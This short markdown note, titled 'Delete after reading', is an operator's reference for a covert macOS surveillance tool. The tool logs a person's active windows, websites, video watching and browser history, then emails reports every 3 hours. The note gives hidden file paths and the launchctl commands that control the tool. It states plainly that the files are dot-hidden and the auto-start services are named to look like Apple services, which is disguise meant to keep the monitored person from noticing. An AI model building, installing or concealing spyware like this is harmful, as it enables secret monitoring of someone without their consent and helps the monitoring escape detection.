# Reference Notes (Delete after reading)

## What It Tracks

1. **Active Window Tracking** (Real-time)
   - Which app is currently in focus
   - Actual time spent in each app
   - Website detection from browser window titles

2. **Browser History** (Periodic)
   - Pages visited
   - Video watching detection
   - Estimated time per page

## Hidden Locations

| What | Path |
|------|------|
| Script | ~/.local/share/.cacheserviced.py |
| Config | ~/.local/.metadata_sync.json |
| Database | ~/.local/share/.cache_index.db |
| Reports | ~/.local/share/.cache_reports/ |
| Tracker Log | ~/.local/share/.cache_reports/.tracker.log |
| Report Log | ~/.local/share/.cache_reports/.service.log |

## LaunchAgents (Auto-start)

| Service | Purpose |
|---------|---------|
| com.apple.metadata.windowtracker | Continuous active window tracking |
| com.apple.metadata.cacheservice | Email reports every 3 hours |

## Commands

```bash
# Test report (without email)
python3 ~/.local/share/.cacheserviced.py --scheduled --minutes 30

# Test with email
python3 ~/.local/share/.cacheserviced.py --scheduled --minutes 30 --send-email

# Manual tracking (foreground)
python3 ~/.local/share/.cacheserviced.py --track

# Check services
launchctl list | grep metadata

# View tracking log
tail -f ~/.local/share/.cache_reports/.tracker.log

# Stop tracking
launchctl unload ~/Library/LaunchAgents/com.apple.metadata.windowtracker.plist

# Start tracking
launchctl load ~/Library/LaunchAgents/com.apple.metadata.windowtracker.plist

# Stop reports
launchctl unload ~/Library/LaunchAgents/com.apple.metadata.cacheservice.plist

# Uninstall completely
./uninstall.sh
```

## Email Reports Include

- Total screen time (actual tracked)
- Time per application (actual)
- Time per website (actual)
- Session counts
- Full interactive HTML report attached

## Notes
- All files hidden (start with ".")
- LaunchAgent names look like Apple services
- Tracking polls every 5 seconds
- Reports emailed every 3 hours
- Requires Accessibility permissions for accurate tracking
